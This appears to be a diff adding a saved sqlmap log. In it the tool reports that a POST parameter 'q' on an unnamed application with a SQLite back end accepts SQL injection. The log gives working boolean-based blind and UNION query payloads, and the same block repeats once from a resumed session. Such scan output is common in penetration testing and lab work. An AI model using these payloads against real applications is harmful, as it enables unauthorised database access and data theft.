@@ -1,0 +1,24 @@
+sqlmap identified the following injection point(s) with a total of 230 HTTP(s) requests:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 1248=1248-- qeZs
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,107,113,107,113)||CHAR(66,115,69,85,66,122,115,98,82,88,68,122,76,121,112,90,72,85,106,116,72,82,84,105,102,105,85,113,100,82,65,79,65,101,115,74,117,90,122,85)||CHAR(113,120,107,112,113),NULL-- RGCi
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: q=test' OR NOT 1248=1248-- qeZs
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,107,113,107,113)||CHAR(66,115,69,85,66,122,115,98,82,88,68,122,76,121,112,90,72,85,106,116,72,82,84,105,102,105,85,113,100,82,65,79,65,101,115,74,117,90,122,85)||CHAR(113,120,107,112,113),NULL-- RGCi
+---
+back-end DBMS: SQLite
